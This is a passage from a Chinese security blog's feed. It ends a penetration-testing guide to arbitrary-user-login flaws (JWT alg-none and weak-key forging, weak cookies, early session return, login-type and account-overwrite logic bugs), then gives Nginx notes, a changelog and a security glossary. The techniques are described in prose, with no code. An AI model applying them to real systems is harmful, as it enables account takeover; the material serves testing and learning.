title="jwt未校验参数&#x2F;使用弱密钥"></a>jwt未校验参数&#x2F;使用弱密钥</h3><p>当系统使用jwt作为认证字段，且其中关键用户信息字段可以遍历时，若未验参或者使用弱密钥时，便可以将用户信息字段进行更改，删除&#x2F;爆破弱密钥重新生成签名，到达任意用户登录</p><h4 id="jwt未校验参数"><a href="#jwt未校验参数" class="headerlink" title="jwt未校验参数"></a>jwt未校验参数</h4><p>&#x3D;&#x3D;删除签名部分(或者更改头部中的alg为none再删除签名)，访问登录后的接口成功访问，说明jwt未验参&#x3D;&#x3D;</p><p><img src="/2023/11/28/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20231128164251426.png" alt="image-20231128164251426"></p><h4 id="jwt弱密钥"><a href="#jwt弱密钥" class="headerlink" title="jwt弱密钥"></a>jwt弱密钥</h4><p>当jwt使用了弱密钥时，爆破到弱密钥后同样修改jwt中的用户信息字段，使用密钥重新生成签名即可获取到其他用户的jwt字段</p><h3 id="弱cookie"><a href="#弱cookie" class="headerlink" title="弱cookie"></a>弱cookie</h3><p>系统使用cookie认证，且cookie字段过于简单(如明文、base64加密等)，导致可伪造</p><h2 id="凭证过早返回"><a href="#凭证过早返回" class="headerlink" title="凭证过早返回"></a>凭证过早返回</h2><p>一般正常的登录流程为服务端校验完用户身份后，返回用户凭证，但某些系统由于登录前会有很多的查询用户信息类的功能请求，经常导致在登录验证前就返回了用户凭证。</p><p>举例一个金融项目，功能是：输入手机号会先去查询手机号是否为已注册用户，是的话就会进入用户信息查询的逻辑，再跳转登录。在信息查询的阶段过早返回了sessionid，导致任意用户登录。如下：</p><p><img src="/2023/11/28/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20231128223131840.png" alt="image-20231128223131840"></p><h1 id="逻辑漏洞导致的任意用户登录"><a href="#逻辑漏洞导致的任意用户登录" class="headerlink" title="逻辑漏洞导致的任意用户登录"></a>逻辑漏洞导致的任意用户登录</h1><h2 id="更改登录type"><a href="#更改登录type" class="headerlink" title="更改登录type"></a>更改登录type</h2><p>部分系统有免密登录&#x2F;快捷登录之类的功能，只要一个账号就能登录，当遇到登录数据包中含有type之类的字段时，可以尝试此方法</p><p><img src="/2023/11/28/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20231128224742351.png" alt="image-20231128224742351"></p><h2 id="账号数据覆盖"><a href="#账号数据覆盖" class="headerlink" title="账号数据覆盖"></a>账号数据覆盖</h2><p>常见于账号信息更新处，例如修改手机号、账户重新绑定、修改账号等功能点处</p><p>以修改手机号为例，此处修改需要输入新手机号与新手机号的验证码</p><p><img src="/2023/11/28/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20231128224911547.png" alt="image-20231128224911547"></p><p>若修改请求中的oldmobile字段为其他手机号，就能将其他用户的账户数据覆盖到新手机号中，达到任意用户登录</p><h1 id="鸣谢"><a href="#鸣谢" class="headerlink" title="鸣谢"></a>鸣谢</h1><ul><li><p><a href="https://forum.butian.net/share/2553">奇安信攻防社区-任意用户登录漏洞挖掘思路 (butian.net)</a></p></li><li><p><a href="https://mp.weixin.qq.com/s/v3st1tmq0k6UyWFPlfEO4g">https://mp.weixin.qq.com/s/v3st1tmq0k6UyWFPlfEO4g</a></p></li><li><p><a href="https://blog.csdn.net/qq_28205153/article/details/113832488">Turbo Intruder 使用 - 拥抱十亿请求攻击_TimeShatter的博客-CSDN博客</a></p></li><li><p><a href="https://cloud.tencent.com/developer/article/1730673">渗透测测技巧之手机号爆破-腾讯云开发者社区-腾讯云 (tencent.com)</a></p></li><li><p><a href="https://mp.weixin.qq.com/s/0S_MQIgpyj0IVwcziXppJw">https://mp.weixin.qq.com/s/0S_MQIgpyj0IVwcziXppJw</a></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx学习笔记</title>
      <link href="/2023/11/24/Nginx%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/11/24/Nginx%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Nginx处理的问题"><a href="#Nginx处理的问题" class="headerlink" title="Nginx处理的问题"></a>Nginx处理的问题</h1><p><img src="/2023/11/24/Nginx%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image1.png"></p><p><img src="/2023/11/24/Nginx%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image2.png"></p><br><h1 id="http代理"><a href="#http代理" class="headerlink" title="http代理"></a>http代理</h1><h2 id="正向代理：代理客户端-去发送请求"><a href="#正向代理：代理客户端-去发送请求" class="headerlink" title="正向代理：代理客户端(去发送请求)"></a>正向代理：代理客户端(去发送请求)</h2><p><img src="/2023/11/24/Nginx%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image3.png"></p><h2 id="反向代理：代理服务器端-去应答请求"><a href="#反向代理：代理服务器端-去应答请求" class="headerlink" title="反向代理：代理服务器端(去应答请求)"></a>反向代理：代理服务器端(去应答请求)</h2><p><img src="/2023/11/24/Nginx%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image4.png"></p><br><h1 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>负载均衡即根据服务器性能处理客户端请求，保证服务器性能最大化</p><p><img src="/2023/11/24/Nginx%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image5.png"></p><h2 id="Nginx的处理方式"><a href="#Nginx的处理方式" class="headerlink" title="Nginx的处理方式"></a>Nginx的处理方式</h2><p>Nginx提供的负载均衡策略有2种：内置策略和扩展策略。内置策略为轮询、加权轮询、Ip hash。扩展策略由用户自定义，十分强大</p><ul><li><p>轮询：平均分配客户端请求给服务器<img src="/2023/11/24/Nginx%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image6.png"></p></li><li><p>加权轮询：按照权重分配客户端请求给服务器【使得一些性能较差的服务器也能上线运行】<img src="/2023/11/24/Nginx%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image7.png"></p></li><li><p>Ip hash：<img src="/2023/11/24/Nginx%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image8.png"></p></li></ul><h2 id="实现动静分离"><a href="#实现动静分离" class="headerlink" title="实现动静分离"></a>实现动静分离</h2><p><img src="/2023/11/24/Nginx%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image9.png"></p><br><h1 id="Nginx下载与配置"><a href="#Nginx下载与配置" class="headerlink" title="Nginx下载与配置"></a>Nginx下载与配置</h1><p><img src="/2023/11/24/Nginx%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image10.png"></p><p><img src="/2023/11/24/Nginx%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image11.png"></p><p><img src="/2023/11/24/Nginx%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image12.png"></p><p><img src="/2023/11/24/Nginx%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image13.png"></p><p><img src="/2023/11/24/Nginx%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image14.png"></p><br><h1 id="Nginx命令"><a href="#Nginx命令" class="headerlink" title="Nginx命令"></a>Nginx命令</h1><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><ul><li><p>start nginx.exe 启动</p></li><li><p>nginx.exe -s stop 停止</p></li><li><p>nginx.exe -s quit 安全退出</p></li><li><p>nginx.exe -s reload 重新加载配置文件</p></li></ul><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><ul><li><p>cd &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;</p></li><li><p>.&#x2F;nginx 启动</p></li><li><p>.&#x2F;nginx -s stop 停止</p></li><li><p>.&#x2F;nginx -s quit 安全退出</p></li><li><p>.&#x2F;nginx -s reload 重新加载配置文件</p></li><li><p>ps aux|grep nginx 查看nginx进程</p></li></ul><br><h1 id="linux服务器中Nginx敏感文件"><a href="#linux服务器中Nginx敏感文件" class="headerlink" title="linux服务器中Nginx敏感文件"></a>linux服务器中Nginx敏感文件</h1><p><img src="/2023/11/24/Nginx%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image15.png"></p><br><h1 id="鸣谢"><a href="#鸣谢" class="headerlink" title="鸣谢"></a>鸣谢</h1><ul><li>狂神说</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>公告-Blog大事纪</title>
      <link href="/2023/11/20/%E5%85%AC%E5%91%8A/"/>
      <url>/2023/11/20/%E5%85%AC%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>2023-12-01：更换樱花雨特效背景、新增图片预加载功能、优化站点搜索功能、扩充tag条数上限</p><hr><p>2023-11-29：修复文字粗体、斜体</p><hr><p>2023-11-28：新增站点字数统计、对外开放“关于我”专栏</p><hr><p>2023-11-20：笔记是学习过程的产物，新笔记的制作和旧笔记的整理(格式转化和排版等)都需要时间，主要是个人接触计算机以来的一些技术栈，涉及内容大类总览如下，各位小伙伴稍安勿躁</p><p><img src="/2023/11/20/%E5%85%AC%E5%91%8A/image-20231120111143155.png" alt="image-20231120111143155"></p><p>每个人都是有自己的生活的，我不想写博客成为一种枷锁，大家也要警惕“拿来主义”，在学习过程中要有自己的思想，热爱自由，享受学习</p><hr><p>2023-10-29：陆续释放个人笔记（受TeamsSix师傅影响，无限学习、无限分享、无限进步）</p><hr><p>2023-09-30：对外开放“画廊”专栏</p><hr><p>2023-09-25：在“计划清单”专栏增设PC桌面端App</p><hr><p>2023-09-19：对外开放“计划清单”专栏</p><hr><p>2023-09-03：增加点击特效、看板娘、雪花背景等主题，并适配主题</p><hr><p>2023-08-30：新增站点统计与站点流量监控</p><hr><p>2023-08-25：对外开放“记录榜”专栏</p><hr><p>2023-08-17：修复流程图渲染功能</p><hr><p>2023-08-15：修复图片、emoji表情、数学公告渲染功能</p><hr><p>2023-08-12：正式建站，开始对外开放Blog</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>信安术语</title>
      <link href="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/"/>
      <url>/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/</url>
      
        <content type="html"><![CDATA[<p>1.关于JS：</p><p>JavaScript(简称“JS”)是一种具有函数优先的轻量级，解释型或即时编译型的编程语言</p><p>（补充）：js框架即Javascript框架,是指以Javascript语言为基础搭建的编程框架</p><p>2.关于CSS：</p><p>即层叠样式表(英文全称：Cascading Style Sheets)是一种用来表现HTML（标准通用标记语言的一个应用）或XML（标准通用标记语言的一个子集）等文件样式的计算机语言。CSS不仅可以静态地修饰网页，还可以配合各种脚本语言动态地对网页各元素进行格式化。CSS 能够对网页中元素位置的排版进行像素级精确控制，支持几乎所有的字体字号样式，拥有对网页对象和模型样式编辑的能力。</p><p>3.关于标记语言(置标语言、标志语言、标识语言)：</p><p>是一种将文本以及文本相关的其他信息结合起来，展现出关于文档结构和数据处理细节的电脑文字编码。与文本相关的其他信息（包括文本的结构和表示信息等）与原来的文本结合在一起，但是使用标记进行标识</p><p>——关于HTML：<br>HTML的全称为超文本标记语言，是一种标记语言。它包括一系列标签．通过这些标签可以将网络上的文档格式统一，使分散的Internet资源连接为一个逻辑整体。HTML文本是由HTML命令组成的描述性文本，HTML命令可以说明文字，图形、动画、声音、表格、链接等</p><p>——关于XML：</p><p>可扩展标记语言 (Extensible Markup Language, XML) ，标准通用标记语言的子集，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。 XML是标准通用标记语言 可扩展性良好,内容与形式分离,遵循严格的语法要求,保值性良好等优点</p><p>(补充)</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image1.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image2.png"></p><p>4.关于WIKI：</p><p>WIKI一般指维基。 Wiki是一种在网络上开放且可供多人协同创作的超文本系统。(通俗地讲，WIKI是一个协同著作平台或称开放编辑系统。我们可以用Wiki来建设帮助系统，知识库系统。如国内公共wiki最著名就是百度百科)</p><p>5.关于WP：</p><p>WriteUp(Write Up)的缩写，即通过攻略、详细描写、详细记载</p><p>6.关于OI：Olympiad in Informatics的简称，指的是“信息学奥林匹克竞赛”</p><p>7.关于Codeforces：</p><p>一家为计算机编程爱好者提供在线评测系统的俄罗斯网站(是一个优质的算法学习平台)</p><p>8.关于AcWing：</p><p>优质的算法学习平台（配备全面系统的知识讲解，配套题库的实战训练，专业在线的答疑辅导等功能）</p><p>9.关于洛谷：一个优质的算法学习平台</p><p>10.关于CCPC：中国大学生程序设计竞赛</p><p>11.关于CVE：</p><p>英文全称是“Common Vulnerabilities &amp; Exposures”，即通用漏洞披露。CVE就好像是一个字典表，为广泛认同的信息安全漏洞或者已经暴露出来的弱点给出一个公共的名称(使用一个共同的名字)</p><p>12.关于OJ：</p><p>Online Judge 平台系统（简称 OJ）是一个 B&#x2F;S 架构的源程序判题系统。是当前 Windows 平台下最好的 OJ 系统。用户可以在线提交多种程序（如 C、C++、Java）源代码，系统对源代码进行编译和执行，并通过预先设计的测试用例来检验程序源代码的正误</p><p>13.关于ICPC：国际大学生程序设计竞赛。英文全称：International Collegiate Programming Contest（简称ICPC），是由国际计算机协会（ACM）主办的，一项旨在展示大学生创新能力、团队精神和在压力下编写程序、分析和解决问题能力的年度竞赛。即ACM国际大学生程序设计竞赛</p><p>14.CTF题目分类：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image3.png"></p><p>(详细说明)</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image4.png"></p><p>15关于bp工具：</p><p>Burp Suite（简称bp）是一个集成化的渗透测试工具，它集合了多种渗透测试组件，使我们自动化地或手工地能更好的完成对web应用的渗透测试和攻击。</p><p>16.CTF竞赛模式：</p><p>(1)CTF解题模式：Jeopardy</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image5.png"></p><p>(2)CTF战争分享模式：Belluminar</p><p>BELLUMINAR CTF赛制由受邀参赛队伍相互出题挑战，并在比赛结束后分享赛题的出题思路，学习过程以及解题思路等。战队评分依据出题得分，解题得分和分享得分，进行综合评价并得出最终的排名</p><p>模式流程与计分规则：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image6.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image7.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image8.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image9.png"></p><p>(3)CTF攻防模式：Attack &amp; Defense &#x2F; Attack with Defense(AwD)</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image10.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image11.png"></p><p>注：gamebox是指主办方给出的系统环境</p><p>(4)CTF攻防增强模式：Attack Defense Plus(ADP)</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image12.png"></p><p>(5)自动化模式：Robo Hacking Game(RHG)</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image13.png"></p><p>(6)真实世界模式：Real World(RW)</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image14.png"></p><p>(7)抢占上头模式：King of Hill(KoH)</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image15.png"></p><p>(8)混合模式：Mix</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image16.png"></p><p>17.CTF中关于零和计分：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image17.png"></p><p>注：“零和”是博弈论的一个概念，意思是双方博弈，一方得利必然意味着另一方吃亏，一方得益多少，另一方就吃亏多少，双方得失相抵，总数为零，所以称为“零和”。(游戏者有输有赢，一方所赢正是另一方所输，游戏的总成绩永远是零)</p><p>18.关于网络拓扑图：指由网络节点设备和通信介质构成的网络结构图</p><p>CTF中的网络拓扑图(文档上一般都会有比赛环境的网络拓扑图，会包括选手，攻防环境，主办方三者的环境)：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image18.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image19.png"></p><p>19.关于shellcode：</p><p>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机器码，让电脑可以执行攻击者的任意指令</p><p>20.关于程序patch：程序补丁&#x2F;修补程序</p><p>21.关于程序check：程序检测</p><p>22.关于 Payload：有效载荷，代码的实际可执行部分(即抛开加壳等封装操作，实际有效的部分)【在计算机科学和电信领域，指的是数据传输中所欲传输的实际信息，也常被称为实际数据或数据体】【在计算机病毒领域，指的是进行有害操作的代码部分】</p><p>23.关于CWE：指常见缺陷列表，是一个安全漏洞词典</p><p>24.关于fuzzing：</p><p>模糊测试 (fuzz testing)是一种软件测试技术。其核心思想是自动或半自动的生成随机数据输入到一个程序中，并监视程序异常(即自动产生并执行大量随机的或经过变异的输入，以期望触发错误条件或引起程序故障)。模糊测试常常用于检测软件或计算机系统的安全漏洞。</p><p> </p><p>25.关于Poc：</p><p>POC是Proof of Concept的缩写，意思是为观点提供证据。它是一组建议的电子模型，可用于演示团队和客户的设计，允许评估和确定概念设计方案。POC的评估可能会导致规范和设计的调整，POC过程中产生的设计承诺和大家认可的意见都会记录在设计调整文档中以备将来参考</p><p>26.关于沙龙：主要指规模较小、议题简要、非正式化的，由行业内的企业聚集在一起进行讨论的会议</p><p>27.关于黑测试和白测试：黑盒测试和白盒测试的简称</p><p>——黑盒测试：将程序视为无法打开的黑盒。在完全不考虑程序内部结构和内部特征的情况下，在程序界面进行测试，只检查程序功能是否按照要求规范规定正常使用，程序是否能适当接收输入数据，产生正确的输出信息。(侧重于检测功能)</p><p>——白盒测试：通过检查软件内部的逻辑结构，对软件中的逻辑路径进行覆盖测试。在程序的不同部位设置检查点，检查程序的状态，确定实际运行状态是否与预期状态一致。(侧重于检测内部结构)</p><p>(补充，灰盒测试)：介于白盒测试与黑盒测试之间的一种测试，是基于对程序内部细节存在有限认知的软件调试方法(即测试者可能知道系统组件之间是如何互相作用的，但缺乏对内部程序功能和运作的详细了解)，多用于集成测试阶段，不仅关注输出、输入的正确性，同时也关注程序内部的情况。灰盒测试不像白盒那样详细、完整，但又比黑盒测试更关注程序的内部逻辑，常常是通过一些表征性的现象、事件、标志来判断内部的运行状态</p><p>28.关于框架(*)：</p><p>框架(Framework)是一个框子——指其约束性，也是一个架子——指其支撑性。</p><p>  IT语境中的框架，特指为解决一个开放性问题而设计的具有一定约束性的支撑结构。在此结构上可以根据具体问题扩展、安插更多的组成部分，从而更迅速和方便地构建完整的解决问题的方案</p><p> (1)框架本身一般不完整，但是可以帮助您快速解决特定问题。没有框架所有的工作都从零开始做，有了框架，可以为我们提供一定的功能，因此我们就可以在框架的基础上开发，极大的解放了生产力。不同的框架，是为了解决不同领域的问题。一定要为了解决问题才去学习框架。</p><p> (2)框架天生就是为扩展而设计的</p><p> (3)框架里面可以为后续扩展的组件提供很多辅助性、支撑性的方便易用的实用工具(utilities)，也就是说框架时常配套了一些帮助解决某类问题的库(libraries)或工具(tools)。【如：java中就是一系列的jar包，其本质就是对jdk功能的扩展】</p><p>29.关于加密狗：即计算机加密锁，是一种软硬件结合的加密产品</p><p>(a). 加密狗又叫加密锁，其是为软件开发商提供的一种智能型的具有软件保护功能的工具</p><p>(b). 软件开发商通过加密狗管理软件的授权，防止非授权使用或抵御盗版威胁，保护源代码及算法</p><p>(c). 加密狗可以简单分为硬件、软件形式的加密</p><p>(d). 一般有并口和usb接口两种(其中usb接口加密狗，外形酷似U盘，又叫usb加密狗)</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image20.jpeg" alt="IMG_256"></p><p>30.关于WAF(Web Application Firewall)：Web应用防护系统&#x2F;网站应用级入侵防御系统&#x2F;Web应用防火墙</p><p>31.关于回显：即返回显示，显示命令执行结果等</p><p>32.关于C\S和B\S：</p><p>——C\S：即Client&#x2F;Serve，客户机&#x2F;服务器结构</p><p>——B\S：即Browser&#x2F;Server，浏览器&#x2F;服务器结构</p><p>33.关于XML、XPath、XSL、XBRL：</p><p>——XML</p><p>即可扩展标记语言(eXtensible Markup Language)，是一种标记语言</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image21.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image22.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image23.png"></p><p>XML 是各种应用程序之间进行数据传输的最常用的工具</p><p>——Xpath</p><p>即XML Path Language，XML的定位语言，是一门在XML文档中查找信息的语言</p><p>——XSL</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image24.png"></p><p>XSLT使用XPath在XML文档中查找信息。XPath被用来通过元素和属性在XML文档中进行导航</p><p>——XBRL</p><p>即可扩展商业报告语(eXtensible Business Reporting Language，XBRL)是一种基于XML的标记语言，用于商业和财务信息的定义和交换</p><p>34.关于强类型语言和弱类型语言：  </p><p>——强类型语言：又称强类型定义语言。是一种总是强制类型定义的语言，要求变量的使用要严格符合定义，所有变量都必须先定义后使用。(通俗的说就是：强类型语言在编译前就把数据类型确定了，被确定了数据类型的变量，如果不强制转换，就永远是给定的数据类型)</p><p>如：.net 、Java、C&#x2F;C++&#x2F;C#、Python、Golang等都是强类型语言</p><p>——弱类型语言：又称弱类型定义语言。与强类型定义相反。(简单来说：弱类型语言是在编译后确定数据类型，没有明显的类型，他能随着环境的不同，自动变换类型)<br>如：VB、JavaScript、PHP等都是弱类型语言</p><p>35.关于旁站、C段：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image25.png"></p><p>(补充，旁站入侵)：旁站即旁边的站点，同服务器说明同ip，所以只要找ip相同的网站即可，它们不一定属于同一家公司。如在入侵目标网站的时候，因没有发现什么漏洞而无法拿下的时候，可以选择旁站入侵。旁站入侵就是找和目标网站同服务器下的某一个网站，从那里突破拿到旁站的webshell然后再突破权限拿下目标站</p><p>36.关于RCE漏洞：全称Remote Command&#x2F;Code Execute，即远程命令&#x2F;代码执行</p><p>37.关于WSL：全称Windows Subsystem for Linux，即Windows Linux子系统</p><p>作用：适用于Windows 的 Linux 子系统可以让开发人员按原样运行GNU&#x2F;Linux环境，包括大多数命令行工具、实用工具、应用程序、指令，且不会产生传统虚拟机或双启动设置开销</p><p>38..关于POC：Proof ofConcept，译作“观点证明&#x2F;漏洞证明&#x2F;概念验证&#x2F;技术验证”，即在漏洞报告中，通过一段描述或一个攻击样例来证明漏洞确实存在</p><p>39.关于EXP：Exploit，译作“漏洞利用”。即在漏洞报告中，通过一段对漏洞如何利用的详细说明或者一个演示的漏洞攻击代码，可以使得读者完全了解漏洞的机理以及利用的方法</p><p>(补充，POC和EXP关系)：POC是用来证明漏洞存在的，EXP是用来利用漏洞的，两者通常不是一类，或者说，PoC通常是无害的，Exp通常是有害的，有了POC，才有EXP</p><p>40.关于VUL：Vulnerability，指漏洞</p><p>41.关于CVE：Common Vulnerabilities &amp; Exposures，译作“公共漏洞和暴露”，又称CVE漏洞编号。CVE就像是一个字典表【如CVE-2015-0057、CVE-1999-0001等】，为广泛认同的信息安全漏洞或者已经暴露出来的弱点给出一个公共的名称。使用一个共同的名字，可以帮助用户在各自独立的各种漏洞数据库中和漏洞评估工具中共享数据。如果在一个漏洞报告中指明的一个漏洞，如果有CVE名称，就可以快速地在任何其它CVE兼容的数据库中找到相应修补的信息，解决安全问题</p><p>(补充，关于CAN)：和CVE的唯一区别是CAN代表的是候选条目，即还未经CVE编辑委员会认可，而CVE则是经过认可的条目。两种类型的条目都对公众可见，条目的编号不会随着获得认可而改变，但会将“CAN”前缀替换成了“CVE”</p><p>42.关于CNCVE：中国(CN)的CVE，是CNCERT&#x2F;CC(国家计算机网络应急处理协调中心)为漏洞进行编号的一个自己的标准。CNCVE不但包含漏洞的描述予以统一定义，还将包括漏洞的补丁、验证等措施，更加方便、有用</p><p>43.关于CNVD：国家信息安全漏洞共享平台。是由国家计算机网络应急技术处理协调中心(简称CNCERT)联合国内重要信息系统单位、基础电信运营商、网络安全厂商、软件厂商和互联网企业建立的信息安全漏洞信息共享知识库</p><p>44.关于CNNVD：中国国家信息安全漏洞库。是中国信息安全测评中心为切实履行漏洞分析和风险评估的职能，负责建设运维的国家信息安全漏洞库，为我国信息安全保障提供基础服务</p><p>45.关于CVSS：Common Vulnerability Scoring System，译作“通用漏洞评分系统”，作为行业公开标准，用来评测漏洞的严重程度，0-10分值越高越严重【评分会受时间和空间影响，如随着时间推移，漏洞相关补丁越多，可被利用性越低；漏洞存在不同的环境，也会影响漏洞的威胁程度】</p><p>46.关于红蓝对抗：红队，指网络实战攻防演习中的攻击一方。蓝队，指网络实战攻防演习中的防守一方。紫队，指网络实战攻防演练中的组织方</p><p>47.关于沙箱&#x2F;沙盒：沙箱在早期主要用于测试可疑软件，测试病毒危害程度等等。在沙箱中运行，即使病毒对其造成了严重危害，也不会威胁到真实环境，沙箱重构也十分便捷。有点类似虚拟机的使用【沙盒 &#x3D; 沙箱】</p><p>沙箱逃逸：沙箱会禁用某些危险函数，沙箱逃逸就是在一个代码执行环境下，冲破种种过滤和限制，最终成功拿到系统命令执行权限或者非法读取文件的过程</p><p>48.关于端口映射&#x2F;端口转发&#x2F;内网穿透：</p><p>·端口映射</p><p>基本介绍：端口映射（Port Mapping）是NAT的一种，功能是把在公网的地址转翻译成私有地址， 采用路由方式的ADSL宽带路由器拥有一个动态或固定的公网IP，ADSL直接接在HUB或交换机上，所有的电脑共享上网</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image26.png"></p><p>示意图：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image27.png"></p><p>·端口转发</p><p>基本介绍：端口转发（Port forwarding）是安全壳(SSH) 为网络安全通信使用的一种方法。SSH可以利用端口转发技术来传输其他TCP&#x2F;IP协议的报文，当使用这种方式时，SSH就为其他服务在客户端和服务器端建立了一条安全的传输管道。端口转发利用本客户机端口映射到服务器端口来工作，SSH可以映射所有的服务器端口到本地端口，但要设置1024以下的端口需要根用户权限。在使用防火墙的网络中，如果设置为允许SSH服务通过(开启了22端口)，而阻断了其他服务，则被阻断的服务仍然可以通过端口转发技术转发数据包</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image28.png"></p><p>示意图：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image29.png"></p><p>·端口映射与端口转发对比：端口映射与端口转发实现的功能类似，但又不完全一样。端口映射是将外网的一个端口完全映射给内网一个地址的指定端口，而端口转发是将发往外网的一个端口的通信完全转发给内网一个地址的指定端口。端口映射可以实现外网到内网和内网到外网的双向通信，而端口转发只能实现外网到内网的单向通信</p><p>·内网穿透</p><p>基本介绍：内网穿透，也即NAT穿透，进行NAT穿透是为了使具有某一个特定源 IP 地址和源端口号的数据包不被 NAT 设备屏蔽而正确路由到内网主机</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image30.png"></p><p>49.关于VPN：</p><p>·VPN集线器 &#x3D; VPN服务器 &#x3D; VPN网关</p><p>——VPN类型</p><p>·站点对站点</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image31.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image32.png"></p><p><img 